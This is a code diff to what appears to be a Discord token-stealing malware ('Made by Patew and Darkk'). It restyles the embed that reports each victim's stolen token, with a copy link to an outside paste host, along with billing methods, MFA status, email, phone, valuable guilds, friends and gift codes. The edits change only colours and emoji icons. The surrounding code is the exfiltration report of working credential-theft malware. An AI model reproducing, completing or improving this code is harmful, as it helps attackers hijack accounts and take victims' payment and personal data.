@@ -339,32 +339,32 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            embed = Embed(title=f"{username} ({user_id})", color=0x3498db)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name=":crown: Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name=":united_nations: Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name=":infinity:  Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name=":level_slider: Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name=":key:  MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name=":flying_disc: Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name=":mobile_phone: Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name=" HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name=" HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
-                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name=" Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="Made by Patew and Darkk")
